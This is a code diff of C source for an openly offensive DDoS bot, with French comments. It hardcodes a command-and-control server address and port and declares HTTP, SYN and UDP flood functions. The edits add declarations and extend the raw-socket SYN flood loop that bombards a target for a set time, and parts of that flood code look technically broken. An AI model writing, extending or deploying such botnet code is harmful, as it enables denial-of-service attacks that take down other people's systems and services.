@@ -1,18 +1,23 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
 #include <string.h>
-#include <sys/types.h>
+#include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <netdb.h>
 #include <arpa/inet.h>
+#include <sys/types.h>
 #include <signal.h>
-#include <fcntl.h>
 #include <errno.h>
+#include <time.h>
+#include <fcntl.h>
 #include <sys/wait.h>
 #include <dirent.h>
-#include <time.h>
+
+// Déclarations des fonctions
+void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
+void http_flood(char* target, int port, int duration);
+void syn_flood(char* target, int port, int duration);
+void udp_flood(char* target, int port, int duration);
 
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
@@ -105,7 +110,9 @@ void syn_flood(char* target, int port, int duration) {
     
     // Créer un socket raw
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) return;
+    if (sock == -1) {
+        return;
+    }
     
     // Configurer l'adresse cible
     memset(&addr, 0, sizeof(addr));
@@ -117,6 +124,11 @@ void syn_flood(char* target, int port, int duration) {
     while (time(NULL) - start_time < duration) {
         // Envoyer des paquets SYN
         sendto(sock, NULL, 0, 0, (struct sockaddr*)&addr, sizeof(addr));
+        usleep(1000);
+    }
+    close(sock);
+}
+
 // Fonction pour effectuer une attaque UDP flood
 void udp_flood(char* target, int port, int duration) {
     int sock;
